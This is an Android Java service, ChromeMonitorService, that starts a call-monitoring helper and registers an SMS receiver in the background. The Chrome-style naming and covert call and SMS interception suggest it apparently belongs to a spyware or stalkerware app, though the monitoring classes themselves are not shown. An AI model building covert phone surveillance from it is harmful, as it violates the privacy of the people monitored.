package com.chromemonitor;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class ChromeMonitorService extends Service {
    private CallHelper callHelper;
    private SmsReceiver smsReceiver;
    private IntentFilter intentFilter = new IntentFilter("SmsMessage.intent.MAIN");
 
    public ChromeMonitorService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        callHelper = new CallHelper(this);
        smsReceiver = new SmsReceiver(this);
  
        int res = super.onStartCommand(intent, flags, startId);
        callHelper.start();
        this.registerReceiver(smsReceiver, intentFilter);
        return res;
    }
 
    @Override
    public void onDestroy() {
        super.onDestroy();
  
        callHelper.stop();
        this.unregisterReceiver(smsReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
   }
}